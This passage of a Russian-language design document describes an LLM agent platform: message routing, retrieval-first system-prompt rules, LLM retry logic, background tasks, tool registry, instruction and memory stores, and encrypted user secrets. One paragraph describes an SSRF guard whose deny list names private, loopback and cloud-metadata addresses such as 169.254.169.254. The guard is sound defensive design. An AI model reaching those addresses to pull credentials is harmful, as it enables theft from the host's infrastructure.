- **Компакция нарратива**: ветка процесса собирается компактором из
  `RunnerConfig.compactor` (порт `ContextCompactor`): блок тем (все саммари
  диалога одним system-сообщением) + горячий хвост (`seq > max(seq_to)`,
  дословно); при переполнении хвоста (`OF_CONTEXT_HOT_MAX_CHARS`) стартует
  фоновая компакция — старейшие сообщения хвоста одним LLM-вызовом в запись
  `dialog_summaries` (guard «одна компакция на диалог», фейл = warning-лог).
  Модуль `context/` + тул `history_search` — см. [context.md](context.md).

### Роутер сообщений (`agent/router.py`)

Маршрутизация отвечает на один вопрос: **чьё это сообщение?** `MessageRouter`
(Protocol): `route(exchanges, message, max_exchanges) -> RouteDecision` —
`RouteAction`: `NEW` (сообщение открывает свой обмен; дефолт), `CONTINUE`
(принадлежит существующему обмену — бывшие INJECT и «ответ на уточнение» разом;
`exchange_id` обязателен), `COMMAND` (чистое управление, отвечать нечего); плюс
`cancel_ids` — обмены, которые пользователь явно попросил остановить. Вход —
кортеж `ExchangeInfo` (id, title, status, pending_question, age_seconds): роутер
рассуждает про обмены — сущность с человеческим текстом, — а не про процессы.
Одно сообщение принадлежит ровно одному обмену, поэтому пакеты операций и
guardrail «inject убивает start_new» исчезли.

Детерминированные слои живут в акторе и до LLM не доходят: транспортный реплай
(`reply_to_exchange_id`) называет живой обмен точно; нет живых обменов → NEW без
вызова.

`LLMRouter(llm, timeout_seconds, prompts)`: one-shot `complete()` с тулом `route`
под `asyncio.wait_for` (системный промпт-шаблон из `PromptProvider` —
`ROUTER_PROMPT_NAME`, плейсхолдеры `{limit}`/`{exchanges}`); каждый обмен подан
одной человекочитаемой строкой — заголовок, статус (queued / being answered right
now / waiting for the user + заданный вопрос), возраст. **Безопасный дефолт —
NEW**: сбой LLM, таймаут, отсутствие tool_call, неизвестный action, CONTINUE в
неизвестный обмен — всё деградирует к новому обмену с WARNING-логом (валидные
`cancel_ids` при этом сохраняются). Асимметрия ошибок осознанная: лишний NEW —
видимый и поправимый лишний ответ; ложный CONTINUE — вопрос съеден чужим прогоном,
тишина. Решение логируется вместе с кандидатами — «почему бот так решил» видно из
лога.

### Системный промпт (`agent/prompts.py`)

Промпты ядра поставляются через порт `PromptProvider` (`get(name) -> str`; имена —
`SYSTEM_PROMPT_NAME`/`ROUTER_PROMPT_NAME`). Дефолт — `StaticPromptProvider` поверх вшитых
констант; web-слой оборачивает его в `FilePromptProvider` (`web/prompts.py`): имена с
настроенным `file:`-источником (`OF_SYSTEM_PROMPT_SOURCE`/`OF_ROUTER_PROMPT_SOURCE`)
читаются из файла на каждый `get()` (правка файла действует без рестарта), нечитаемый файл
или ненастроенное имя — fallback на вшитый дефолт (warning в лог). Ядро env не читает.
`RunnerConfig` держит провайдер (а не строку): системный промпт подставляется в ветку
процесса при старте как есть (байт-стабилен для prefix-cache; текущая дата — конвертом
последнего сообщения ветки, см. «Актор диалога»).

Текст вшитого `DEFAULT_SYSTEM_PROMPT` — только мета-правила, и первые три из них
задают **приоритет извлечения над импровизацией**:

1. **Сначала поиск.** На любой запрос сложнее small talk (или вопроса, на который
   отвечает сам диалог) первый шаг — `recall`: один поиск покрывает
   сценарии, знания, дескрипторы датасетов И память о пользователе. Запрос — «интент +
   сущность» (`remind reminder`, `report user-data`, `call-api weather`); второй запрос
   «про пользователя» в том же ходу, когда ответ может зависеть от него лично. Поиск
   локальный и дешёвый, без анонсов и разрешений: лишний поиск стоит меньше
   пропущенной инструкции или забытой памяти. Триггер распространяется и на
   **утверждения**, не только на задачи: факты об этой инсталляции, о себе, о своём
   авторе, о возможностях, о том, что пользователь говорил раньше, — живут в сторе,
   а не «в голове»; сначала поиск, а на пустую выдачу — честное «не знаю». Выдумывать
   факты о себе и о системе запрещено. Чтобы вопросу «кто твой автор?» было что
   находить на любой инсталляции, реестр поставляет системную knowledge-запись
   `about_octoforge` (что за система, модель способностей, поверхности) — а
   специфику конкретной инсталляции админ добавляет своими knowledge-записями.
2. **Найденное обязательно.** Сценарий или endpoint-запись определяют, как делается
   задача: шаги, выбор тула и параметры выполняются как написано. Свой подход —
   только когда поиск не дал ничего пригодного, с явной оговоркой об этом.
3. **Никакого перебора.** Контракт внешней системы, скорее всего, уже лежит в
   сторе — искать его, а не угадывать URL и параметры; два однотипных провала
   означают «искать снова или честно сообщить», а не «третий вариант».

Дальше — прежние мета-правила: отвечать «сначала суть, потом детали» (прерывание
полезно); на служебные system-заметки (прерывание прогона, отказ по лимиту) —
реагировать по ситуации и доносить до пользователя, когда его касается; после нового
многошагового сценария — сохранить его через `instruction_save`, а факты разводить по
аудитории (персональные — в память, общеполезные — в knowledge, трекеры — в датасеты);
разметка ответов — markdown (`**bold**` для акцентов и заголовков, списки дефисом,
код в fenced-блоках, табличные данные — pipe-таблицами, ASCII/псевдографика запрещена):
клиент рендерит её нативно (Telegram — rich-апгрейдом финала, см. выше). Пер-туловая
методика (крон, фон, память, датасеты, история, веб, внешние вызовы) живёт в системных
сценариях реестра (`instructions/registry.py`, см. [instructions.md](instructions.md))
и попадает в контекст поиском (`recall` на каждый непокрытый интент). Реестр — дефолт в коде;
инсталляция правит его файловым оверлеем (`OF_SYSTEM_SKILLS_SOURCE`, `web/skill_overlay.py`):
дописать/заменить текст записи или добавить свою — без пересборки и без правок ядра
(зачем это понадобилось и замер по русским запросам — в [instructions.md](instructions.md)).

Почему так, а не «мягкой» формулировкой прежней версии: замер на живой модели
(8 типовых запросов, стаб-тулы с боевыми описаниями, считается первый ход) дал
4/8 против 10/10 после правки. Прежний текст ронял именно то, на что жаловались:
`data_put` без поиска сценария, `task_create` без поиска, а на «погоду» —
`recall` → `external_call` → `web_search` → `web_search` до упора в
лимит итераций, то есть перебор вместо честного отчёта. Правило «поиск бесплатен»
формулируется в промпте явно, иначе модель оптимизирует поиск как «лишний вызов».
Ту же политику несут **описания тулов** (они попадают в контекст всегда, в отличие
от сценариев): у `recall` — «первый тул на любой непустяковый запрос,
ищет всё, включая память», у `http_request` — «путь отступления, не по умолчанию:
сначала поищи endpoint, не исследуй API перебором», у `web_search` — «только
публичные факты; своё — в инструкциях и памяти».

В правиле 2 есть и **стоп-клаузула поиска**: два по-разному сформулированных
запроса без пригодной выдачи закрывают вопрос — способность без записи в сторе
(интеграция, источник данных) здесь не существует, об этом говорится прямо, а не
прощупывается другими тулами. Добавлена по замеру: на «проверь мой календарь»
(интеграции нет) модель делала шесть `recall` подряд, потом `task_list` и
`web_search` — до упора в лимит итераций; со стоп-клаузулой — честное «календарь
не подключён» за 3–5 поисков.

Контрольный замер после переезда на `recall`/`endpoint_get` (фаза 4, 2026-07-25,
живой deepseek-v4-pro, стаб-тулы с боевыми описаниями): первый ход 11/11 (включая
«кто твой автор?» и «что ты умеешь?» → `recall`; small talk и арифметика — без
тулов); сквозные цепочки 4/4 — погода `recall → endpoint_get → external_call`
(позднее связывание работает), автор отвечается из knowledge-записи, память
пересказывается из выдачи `type=memory`, отсутствующая интеграция признаётся
честно.

### Стриминг LLM (`llm/openai.py`)

`complete()` — обычный (non-streaming) вызов, используется LLM-роутером (one-shot с tool call).
`stream()` — `stream=true`: парсинг SSE-чанков (delta.content → `TextDelta`,
delta.tool_calls — аккумуляция по index со склейкой arguments). Слот закрывается при
переходе дельт на следующий index (последний — на `finish`): валидные аргументы →
`ToolCallReady`, битый JSON → `ToolCallBroken` (в финальном сообщении такой вызов остаётся
с пустыми аргументами — стрим не падает). В конце — `StreamFinished(message)`, источник
истины для истории. `aclose()` на генераторе обрывает HTTP-соединение — основа отмены.

### Ошибки LLM и ретраи (`llm/errors.py`, `llm/retry.py`)

Голый `raise_for_status()` заменён типизированной таксономией: классификация по
HTTP-статусу и телу ошибки (`error.code`/`error.type` OpenAI-пayload'а) —
`RateLimitError` (с `retry_after` из заголовка Retry-After), `AuthError`, `QuotaError`,
`ContextOverflowError`, `ProviderInternalError`, `TransportError` (httpx-ошибки
транспорта), `ClientError` (прочие 4xx). Общий хелпер `raise_for_error_status`
применяют все три HTTP-клиента пакета (чат, эмбеддинги, реранкер), транспортные
httpx-ошибки каждый оборачивает в `TransportError`. Маркеры тела информативнее статуса и
проверяются первыми: провайдеры отдают исчерпание квоты как голый 429 с
`insufficient_quota` в теле — это фатальный `QuotaError`, а не ретраибельный
rate-limit. Поле `retry_after` живёт в базовом `LLMError` — подсказку Retry-After
несёт любая HTTP-ошибка (например, 503), а не только 429; заголовок парсится в обеих
формах (секунды и HTTP-date). Транзиентные классы — rate_limit,
provider_internal, transport; остальные фатальны. Одноразовые HTTP-бэкенды
(эмбеддинги, реранкер) ретраят транзиентные классы через хелпер `retry_transient` —
одна дополнительная попытка с минимальной фиксированной задержкой
(`SHORT_RETRY_MAX_RETRIES`/`SHORT_RETRY_DELAY_SECONDS`): транзиентный 429 эндпоинта
эмбеддингов не должен валить `recall`, но и сталлить поиск нельзя.
Ленивая загрузка локальных моделей (bi-encoder, cross-encoder) — под
`threading.Lock`: конкурентные первые вызовы из worker-потоков не грузят модель дважды.

Поверх порта `LLMClient` — декоратор `RetryingLLMClient` (оборачивает любую
реализацию, навешивается только в composition root, `build_llm_client`): экспоненциальный
backoff с full-jitter, ретраятся только транзиентные классы, лимит — в `LLMConfig`
(`OF_LLM_MAX_RETRIES`, `OF_LLM_RETRY_BASE_SECONDS`,
`OF_LLM_RETRY_MAX_SECONDS`). `Retry-After` — пол задержки, а не точное значение: сверху
добавляется положительный джиттер (клиенты с одинаковой подсказкой провайдера не
ретраятся в унисон), а итог капится константой `RETRY_AFTER_DELAY_CAP_SECONDS` (300 с),
чтобы экстремальный hint вроде `Retry-After: 3600` не усыплял процесс на часы. `complete()` ретраится молча (warning-лог). `stream()`
ретраится только если сбой случился ДО первого события стрима (после первой дельты
повтор задвоил бы вывод); перед повтором в стрим отдаётся событие `RetryScheduled`,
которое петля мапит в LoopEvent — web (SSE `retry_scheduled`, статус-строка в UI) и
Telegram (статус-строка «повтор N через X сек») показывают ретрай вместо молчания.
Исчерпание попыток — исходная ошибка (раннер вещает `Failed`, как и раньше).

### Usage capture (`llm/usage.py`)

Клиент просит учёт токенов у провайдера (`stream_options.include_usage` при
стриминге; usage-only финальный чанк без `choices` парсится, стрим не ломается).
DTO `Usage` (prompt/completion/cached токены) приезжает в `StreamFinished`, а
`complete()` возвращает DTO `Completion(message, usage)` — порт изменился, фейки
обновлены. Петля пробрасывает usage в события `AssistantMessage`/`Finished`;
раннер персистит токены на assistant-сообщении (колонки
`prompt_tokens`/`completion_tokens`, миграция `4c7e2b9a1f63`). Потребители:
токенный триггер компакции ([context.md](context.md), `OF_MODEL_CONTEXT_TOKENS`/
`OF_CONTEXT_BUFFER_TOKENS`) и фундамент per-user учёта стоимости.

### Реактивная компакция и rolling merge (`context/`)

`ContextOverflowError` (класс из таксономии выше) не убивает прогон: раннер
синхронно компактит нарратив через порт `ContextCompactor.compact_now`,
пересобирает ветку процесса (голова и trail на месте, нарратив — заново через
`assemble`) и повторяет прогон один раз; повторный overflow → честный `Failed`.
Суммаризации сливаются rolling merge'ем: промпт получает предыдущее саммари и
обновляет его (структура Goal/State/Next/Decisions, точные идентификаторы
сохраняются), стор замещает записи диалога одной (`replace_for_dialog`) —
размер блока тем константный. Подробности — [context.md](context.md).

## Фоновые задачи

Задача — это процесс актора, подкреплённый записью в `TaskStore`
(исполнение = pump-процесс; глобальный поллер упразднён). Запись хранится вечно:
терминальные статусы не удаляются, доставку результата фиксирует `delivered_at`;
сам результат — финальное сообщение в нарративе (`messages`), связанное с задачей
через `messages.task_id`.

- `tasks/models.py`: `Task` (id, dialog_id, user_id, channel, title, kind, input, status,
  result, error, created_at/started_at/finished_at/delivered_at — через `utc_now()`);
  `TaskKind(RUN|ANSWER)` (RUN — отложенная работа и крон-выстрелы; ANSWER — внутренняя
  механика ответа на сообщение пользователя, в тулах не видна), `TaskStatus(PENDING|
  RUNNING|DONE|FAILED|CANCELLED` — последний также терминал процессов и
  `cron_jobs.last_status`). `channel` и `user_id` денормализованы в задачу: доставка
  уходит на поверхность, с которой задача запущена, без join'а к dialogs.
- `TaskStore` (Protocol в `tasks/store.py`): add/get/list(dialog_id)/mark_done/
  mark_failed/mark_cancelled/delete/list_orphaned/list_undelivered/mark_delivered
  (`list_orphaned` — PENDING/RUNNING, read-only; `list_undelivered` — DONE/FAILED с
  `delivered_at IS NULL`). Реализации:
  `SqlAlchemyTaskStore` (`db/repositories.py`, боевой путь) и `InMemoryTaskStore` (тесты).
- **Спавн**: тул `task_create` без `schedule` делегирует порту `TaskSpawner`
  (`tasks/spawner.py`), который актор биндит на диалог (`ToolContext.task_spawner`,
  опциональный — контексты вне актора обходятся без него). Спавнер проверяет лимит
  процессов (отказ текстом), создаёт `Task(kind=RUN, status=RUNNING,
  input={title, prompt})` и сразу поднимает bg-процесс с id = task.id, коротким
  системным промптом фоновой задачи и user-сообщением из prompt. Спавн — всегда
  в фон (вызывается из работающего fg).
- **Завершение**: DONE → mark_done с финальным ответом, FAILED → mark_failed,
  отмена → mark_cancelled; доставка в диалог — по факту терминации через outbox
  (см. «Актор диалога»), ровно один раз: отправка → проставление `delivered_at`
  (краш между ними лечится редоставкой на старте, дубликат в транспорте — принятый
  риск). Исход cron-tagged задачи репортится в `TaskOutcomeListener`.
- **Остановка**: тул `task_delete` (поглощает удаление крон-задач): активную задачу
  останавливает через порт `TaskDeleter` (`tasks/spawner.py`, bound в акторе —
  `control.cancel()` + ожидание финализации pump) — запись остаётся со статусом
  CANCELLED; самоудаление из собственного прогона отклоняется
  (`ToolContext.owner_task_id`).
- **Startup-recovery** (`ConversationManager.recover_interrupted()`, вызов из
  `runtime()` до старта планировщика и поверхностей): процессы живут в памяти, поэтому
  при рестарте их «тени» в `tasks` подметает sweep — `list_orphaned()` (PENDING/RUNNING)
  и `list_undelivered()` (терминальные строки без `delivered_at` — не доставлено из-за
  краша). Осиротевшая задача перезапускается фоновым процессом (`restart_task`,
  queue-режим: ветка RUN — `BACKGROUND_TASK_PROMPT` + prompt, ANSWER — system +
  снапшот нарратива); превышение лимита процессов → `mark_failed` + доставка `Failed`.
  Исход cron-tagged задачи репортится через `TaskOutcomeListener` после финализации
  перезапущенного процесса (штатная политика `CronOutcomeReporter`). После рестарта
  осиротевших задач порядок продолжает `_revive_unowned_open()`: он берёт то, что
  ещё осталось в `OPEN` без владельца (`ExchangeRepository.list_unowned_open`,
  без аргумента — по всем диалогам) — обмен, чья запись создана, но чей прогон
  так и не возник (краш ровно в этом окне), — и для каждого поднимает раннер
  нужного диалога и просит его `resume_stranded()` (тот же путь, что и свип по
  освободившемуся слоту, см. «Решения аудита 28.07.2026» выше). Недоставленные
  результаты редоставляются штатным путём: `runner.request_result_delivery(task_id)`
  кладёт в инбокс ту же команду `_ProcessTerminated`, что и pump живого процесса
  (идемпотентно по `delivered_at`). Sweep идёт до старта поверхностей, поэтому
  подписчиков в этот момент нет: редоставка остаётся в outbox и уходит при первом
  `subscribe()` (прогрев Telegram-бриджа, подключение SSE) — см. «Доставка без LLM».
  Sweep никогда не роняет старт: каждый шаг под
  try/except, операции идемпотентны и дожидаются следующего рестарта.

Скилы задач (`tasks/tools.py`) — единая поверхность фоновых задач и крон-задач:
`task_create` (без `schedule` — фоновая задача-процесс текущего диалога; со
`schedule` — крон-задача через `create_job`, timezone по умолчанию UTC),
`task_list` (две секции: RUN-задачи диалога — активные или ждущие доставки —
+ крон-задачи пользователя),
`task_delete` (останавливает задачу — строка остаётся CANCELLED; удаляет крон-задачу).

## Скилы

> **Модель v3** ([instructions.md](instructions.md)): встроенные функции кода — тулы
> (кодовые имена `Tool`/`ToolSpec` пока сохраняются), «скил» — сценарий в сторе
> инструкций, «инструкция типа tool» — эндпоинт. Раздел ниже — про фреймворк тулов.

Скил — единица, которую агент вызывает через LLM tool calling (в терминологии модели
v3 — тул; переименование кода отложено). Реализации живут в доменных модулях
(`cron/tools.py`, `memory/tools.py`, `datasets/tools.py`, `context/tools.py`,
`tasks/tools.py`, `search/tools.py`, `net/tools.py`, `instructions/tools.py`):
`http_request`, `task_create`, `task_list`, `task_delete`, `recall` (бывший
`instruction_search`: имя тула — интерфейс для LLM, «recall» одинаково покрывает
и «как сделать отчёт», и «кто мой автор», и «что юзер говорил раньше»),
`instruction_save`, `instruction_delete`, `endpoint_get` (позднее связывание ручек,
см. [instructions.md](instructions.md)), `external_call`, `data_put`, `data_query`,
`data_forget`, `memory_store`, `memory_delete`, `cron_pause`,
`cron_resume`, `web_search`, `history_search`.
Подключаются в composition root. Имена тулов — с подчёркиваниями, не с точками:
точки в function-name несовместимы с OpenAI tool-calling (зафиксированное решение).
`SkillOrigin` упразднён: `ToolRegistry` хранит тулы под уникальными именами
без деления на типы.

Абстракция (`tools/base.py`): `ToolSpec` (name, description, parameters_schema — JSON Schema);
`Tool` (Protocol): `spec` + `async execute(arguments, context) -> str`;
`ToolContext` — per-invocation контекст (user_id, channel, dialog_id + опциональные
`task_spawner`/`task_deleter` — None вне актора, `task_create` без спавнера отказывает —
и `owner_task_id` фоновой задачи, из которой вызван тул).
Аргументы валидирует сам тул (`ToolArgumentsError`).

Скил `web_search` зависит от порта `SearchProvider` (модуль `search/`: транспорт-нейтральные
DTO `SearchResponse`/`SearchResult`, ошибка `SearchError`), а не от конкретного поисковика:
дефолт — `SerperSearchProvider` (serper.dev, регистрируется при `OF_SERPER_TOKEN`),
инсталлятор подставляет свой провайдер (Bing/Brave/Tavily) в composition root. Форматирование
выдачи, клэмп `num_results` (1..10) и срез вывода — ответственность тула.

### Динамические скилы (план, после появления БД)

`skills/dynamic/engine.py`: `SandboxedEnvironment(enable_async=True, undefined=StrictUndefined)`,
рендер через `render_async`. В шаблоне: `params`, `http`, `memory` (скоп юзера + глобальные),
`llm.ask` (one-shot, без вложенных скилов). Пример:

```jinja
{% set r = http.get("https://api.example.com/users/" ~ params.user_id) %}
{% if r.status == 200 %}
  {% set summary = llm.ask("Summarize: " ~ r.text) %}
  {{ memory.store("user_" ~ params.user_id, summary, tags=["api"]) }}
  {{ summary }}
{% else %}
  API error: {{ r.status }}
{% endif %}
```

### Будущие базовые скилы (план)

- `skill.list / skill.run / skill.save / skill.delete` — каталог и запись динамических скилов

## Инструкции и внешние вызовы (этап B)

Модель типов (знание/скил/тул, модульность, безопасность) — в [instructions.md](instructions.md).
Реализация:

- **Модуль `instructions/`** — самодостаточный: хранит, ищет и ранжирует записи трёх типов.
  Граница — `api.py` (Protocol `InstructionService`: `search`/`search_all`/`save`/
  `get_by_name`/`delete`/`publish` + системная грань `save_system`/`list_system`/
  `delete_system`, DTO
  JSON-совместимые под будущую HTTP-границу; **порт хранилища `InstructionStore`** — CRUD +
  `list_with_embeddings` — и runtime-checkable capability `InstructionVectorSearch` для
  сторов с поиском на своей стороне, напр. pgvector). Локальная реализация
  `LocalInstructionService` получает стор конструктором (дефолт —
  `SqlAlchemyInstructionStore`, таблица `instructions` — собственность модуля), эмбеддинг
  `title + "\n" + content` через порт `EmbeddingClient` (два бэкенда: OpenAI-совместимый
  `llm/embeddings.py` и локальный sentence-transformers `llm/local_embeddings.py`; выбор —
  `OF_EMBEDDING_BACKEND`), ранжирование — brute-force cosine + буст точного `title`
  (`ranking.py`, чистые функции; полная формула 70/30 + MMR — позже подменой модуля).
  Скоринг векторизован numpy и вынесен с event loop (аудит 2026-07-26): чистопитоновский
  косинус замораживал весь процесс на ~850 мс при 10k записей на каждый `recall`;
  теперь — матричное произведение в `asyncio.to_thread`, причём конвертация
  кортежи→массив чанкована (один сплошной `np.asarray` держит GIL и столл возвращался
  даже из потока) — замер после: максимальный разрыв event loop 19 мс при 10k. Записи с
  пустым/чужим по размерности вектором получают score 0, а не ошибку (отложенные
  эмбеддинги, смена модели). Маппинг строк стора в DTO тоже уведён в `to_thread`.
  Дальше по масштабу — pgvector (порт `InstructionVectorSearch` готов). Плюс
  опциональный реранк шортлиста кросс-энкодером (`OF_RERANKER_MODEL`; двухстадийная схема
  как в b2e: cosine-шортлист `rerank_candidates` → cross-encoder → top-k). Бэкенд реранка
  выбирается в composition root: с `OF_RERANKER_API_KEY` — HTTP-клиент
  (`llm/http_reranker.py`, SiliconFlow-совместимый POST /rerank: группировка пар по запросу,
  скоры маппятся обратно по индексу документа), без ключа — локальный кросс-энкодер
  (`llm/reranker.py`, тяжёлый на CPU). Если стор
  реализует `InstructionVectorSearch`, сервис делегирует ему выбор кандидатов
  (`search_by_vector`) вместо полного скана таблицы; буст и реранк остаются на сервисе.
  `search` инкрементирует `usage_count` возвращённых хитов.
  **Владельцы и видимость (v4, 2026-07-23)**: у записи есть `owner_id` (NULL =
  публичная); `save` создаёт приватную запись с владельцем из сессии
  (`ToolContext.user_id`, не из аргументов тула) и штампует **авторство**
  (`author_id`, миграция `d4b8f1c6e250` — бэкфилл owner → author), `search(user_id,
  query, k, kind?)` ранжирует только публичные и свои (фильтр `kind` до ранжирования),
  `delete(user_id, id)` — только свои (чужая/публичная = NotFound), поверх публичной
  записи сохранение создаёт личную копию-затенение — **кроме автора**: публикация
  переносит видимость, а не авторство (`publish` переписывает уходящего владельца в
  `author_id`), поэтому `save` автора обновляет опубликованную запись на месте (та
  остаётся публичной, версия растёт, автор сохраняется; апдейт никогда не очищает
  `author_id` — системный синк не срезает авторство); публикация — админская
  поверхность `publish(id)` (owner → NULL, author остаётся)
  + `search_all` (без фильтра видимости); уникальность `(type, title, owner_id)` +
  частичный индекс на публичные `(type, title)`; `get_by_name` видит свои+публичные
  (своя копия первая), исполнитель endpoint'ов ходит с user_id — приватный эндпоинт
  чужака не исполняется.
  Системная часть стора — декларативный реестр (`CORE_SYSTEM_SKILLS` core + прикладные
  пакеты установщика, у web — `WEB_SYSTEM_SKILLS` с погодным примером): синк
  `sync_system_registry` в lifespan upsert'ит записи как `system=true` (усыновляя
  публичные легаси-записи) и удаляет системные записи, исчезнувшие из реестра; пользовательские
  записи (`system=false`) не трогает. Неизменная системная запись (совпали content и
  tags) пропускается без переэмбеддинга и бампа версии — повторный старт не жжёт
  платные вызовы HTTP-бэкенда; гонка find-then-insert двух инстансов на одной SQLite
  (web + standalone) ловится в сторе: `IntegrityError` на INSERT → повтор как UPDATE.
  Запускается при `embeddings_configured()`
  (local-бэкенд или заданный ключ); падение синка не роняет старт — warning в лог.
- **Исполнение — вне модуля** (`net/`): `ExternalCallExecutor` читает tool-запись через
  `get_by_name`, парсит `ToolSpec` (JSON: method, url_template, params_schema, auth),
  валидирует параметры по схеме (required присутствуют, неизвестные запрещены), рендерит
  url-шаблон подстановкой с `urllib.parse.quote`, проверяет URL гвардом, подставляет
  служебную авторизацию только для белого списка base-url-префиксов (конфиг composition
  root, `OF_EXTERNAL_CALL_AUTH_WHITELIST`) и выполняет запрос с `follow_redirects=False`
  (редирект обошёл бы проверку гварда). Тело ответа режется до 8000 символов.
- **SSRF-гвард** (`net/guard.py`): resolve хоста (resolver инъектируется, в тестах — stub)
  → отказ, если ЛЮБОЙ из адресов private/loopback/link-local (включая 169.254.169.254)/
  multicast/reserved/unspecified или не globally-routable (CGNAT 100.64/10). Применён в
  `ExternalCallExecutor` и в туле `http_request` (там тоже `follow_redirects=False` —
  поведение не изменилось, httpx и раньше не следовал редиректам по умолчанию). Известное
  ограничение TOCTOU/DNS-rebinding задокументировано в docstring гварда.
- **Рантайм-тулы** — тонкие адаптеры (`instructions/tools.py`): `recall(query, k?, type?)`
  (k по умолчанию — `OF_INSTRUCTIONS_TOP_K`; ответ — полные сценарии + id записей,
  без сниппетов; `type` сужает поиск до одного вида),
  `instruction_save(type, title, content, tags?)` (приватная запись владельца из сессии;
  системные записи защищены: `SystemInstructionError`),
  `instruction_delete(id)` (только свои записи), `external_call(name, params?)` (`net/tools.py`).

## Датасеты пользовательских данных (этап C)

Модель и обоснование — в [data-store.md](data-store.md). Реализация:

- **Модуль `datasets/`** — обособленный, зеркалит `instructions/`: граница `api.py`
  (Protocol `DatasetService`: `create_dataset`/`get_dataset`/`add_record`/`query_records`/
  `delete_dataset`/`search`, DTO JSON-совместимые под будущую HTTP-границу; **порт хранилища
  `DatasetStore`** — дескрипторы/записи/`list_with_embeddings` — и runtime-checkable
  capability `DatasetVectorSearch` для сторов с поиском на своей стороне). Локальная
  реализация `LocalDatasetService` получает стор конструктором (дефолт —
  `SqlAlchemyDatasetStore`, таблицы `datasets` + `dataset_records` — собственность модуля),
  эмбеддинг дескриптора `name + "\n" + description + "\n" + usage_notes` через общий порт
  `EmbeddingClient` (`llm/embeddings.py`, перенесён туда из `instructions/`), ранжирование —
  brute-force cosine + буст точного имени (свой `ranking.py`, от instructions не зависит);
  vector-capable стор получает `search_by_vector(owner, embedding, k)` вместо полного скана.
- **Схема датасета** — JSON `{"fields": [{"name", "type", "required?"}]}`; типы
  `string|integer|number|boolean|date|datetime` (`validation.py`: bool не считается
  integer/number, date/datetime — ISO-строки; лишние поля записи разрешены). Валидация
  записей — на стороне тулов (`data_put`), сервис доверяет вызывающему.
- **Запросы записей**: SQL-фильтр по `created_at` + `ORDER BY created_at DESC` + cap
  `MAX_SCAN_ROWS` (1000); фильтр `equals` — в памяти, тип-чувствительный (`5 != "5"`);
  агрегация — LLM по выборке. Owner-изоляция — `WHERE owner_user_id` на уровне SQL
  во всех операциях: чужой датасет неотличим от несуществующего.
- **Скилы** — тонкие адаптеры: `data_put(dataset, record, description?, schema?,
  usage_notes?, retention?)` (create-if-absent: при отсутствии датасета schema+description
  обязательны; гонка create-after-get ловится `DatasetExistsError` → повторный get),
  `data_query(dataset, equals?, date_from?, date_to?, limit?)` (date-only = весь день
  UTC; лимиты `OF_DATASETS_QUERY_DEFAULT_LIMIT`/`OF_DATASETS_QUERY_MAX_LIMIT`),
  `data_forget(dataset)` (явный каскад DELETE записей, ответ — счётчик).
- **Дескрипторы в `recall`**: тулу передан `DatasetService` (опциональный
  параметр конструктора), хиты обоих фасадов сливаются по убыванию score; датасеты
  форматируются как `[dataset] <name>` со сниппетом description + списком полей.

## Память (этап D; с 2026-07 — тип в сторе инструкций)

Модель (per-user, кросс-поверхностная) — в [dialogs.md](dialogs.md). Принятое решение
(итог обсуждения «три памяти — это много»): **память — это тип записи в общем сторе
инструкций**, а не параллельное хранилище. Запись памяти структурно — приватная
knowledge-запись: `InstructionType.MEMORY`, `title` = ключ памяти, `owner_id` =
пользователь. Раздельными остаются только **двери записи** (интент «запомни про
пользователя» ≠ «сохрани общее знание»), дверь чтения одна.

- **Что это дало.** Один поисковый механизм (эмбеддинги + буст точного заголовка +
  опциональный реранкер) вместо параллельного LIKE-поиска: агент больше не должен
  угадывать подстроку — семантика находит «день рождения» по «birthday». Один вызов
  (`recall`) вместо двух в первом ходу. Минус один тул из всегда-в-контексте
  (`memory_search` удалён). Прежний «каталог по пустому query» удалён вместе с ним —
  это был костыль под слабость LIKE; на вопрос «что ты обо мне помнишь?» скил
  `user_memory` предписывает поиск `type=memory` широкими запросами.
- **Гарантии типа**: memory-запись всегда owned и никогда не публикуется —
  `store.publish` отвечает `None` для типа memory (для админ-поверхности
  нераспубликовываемая запись неотличима от отсутствующей), `instruction_save`
  отклоняет `type=memory` (писать память — только через `memory_store`), а
  `search_all` (админский кросс-пользовательский поиск) не выдаёт память без явного
  `kind=MEMORY`. В консоли вкладки «инструкции» и «память» делят одну таблицу по типу.
- **Тулы** — интентные обёртки над фасадом инструкций: `memory_store(key, content,
  tags?)` (upsert по (memory, key, owner), версия бампается), `memory_delete(key)`
  (только своя запись; not-found — текстом). Параметр `scope` убран: мгновенно
  глобальная запись любым пользователем обходила publish-гейт знаний; путь к общему
  факту — knowledge + publish админом. Имена с подчёркиваниями (`memory_store`, не
  `memory.store`): точки в function-name несовместимы с OpenAI tool-calling.
- **Отложенный эмбеддинг**: `memory_store` вызывается автономно посреди диалога, и
  падение эмбеддинг-бэкенда не должно терять факт — `save` деградирует до пустого
  вектора (warning в лог), а стартовый sweep `reembed_missing()` (вызывается в
  композиции рядом с синком реестра) досчитывает вектора батчем. Тот же механизм
  обслуживает миграцию данных: alembic-ревизия `f2a6c8d1e935` переносит строки
  `memories` → `instructions` с пустыми векторами (миграции идут без эмбеддера) и
  дропает таблицу; глобальные легаси-записи (`user_id` NULL) становятся публичными
  (видимость сохранена). Пустой вектор безопасен для ранжирования (нулевая норма →
  score 0) и находится по точному заголовку. Проверено репетицией на клоне прод-базы:
  5/5 записей перенесены, sweep дал 5 векторов, память ранжируется первой по своим
  темам.
- **Bootstrap-нюанс**: `create_all` больше не создаёт `memories`, поэтому адопция
  pre-Alembic базы различает возраст по наличию этой таблицы — есть `memories` →
  stamp baseline и полный прогон цепочки (включая перенос), нет → stamp head.
- **Промпт**: методика — в системном скиле `user_memory`; в системном промпте память
  входит в правило 1 (один `recall` покрывает и её; второй запрос «про
  пользователя» в том же ходу, когда ответ может зависеть от него лично). Автоинъекция
  памяти в контекст по-прежнему сознательно не делается — поиск по требованию дешевле
  по токенам и не ломает prefix-cache системного сообщения.

## Секреты пользователей (2026-07-26)

Задача: агент работает с API, требующими пользовательских токенов (почта и т.п.), но
секреты не должны попадать в LLM-контекст, архив сообщений, логи и бэкапы в плейнтексте.

**Модель.** Модуль `secrets/` в core: таблица `secrets(user_id, code, ciphertext,
allowed_host, ...)`, шифрование Fernet (ключ `OF_SECRETS_KEY`; пустой = фича выключена,
кривой — падение на старте). Значение покидает стор через единственный метод
`resolve(user_id, code, host)`. Всё остальное в системе знает только **код** секрета.

**Подстановка.** Endpoint-запись объявляет `"auth": {"secret": "код", "header": ...,
"format": "Bearer {value}"}`; исполнитель `external_call` резолвит код в момент запроса
и кладёт значение ровно в один заголовок. Ключевые решения безопасности:
- подстановка существует ТОЛЬКО в админском шаблоне записи, никогда — в значениях
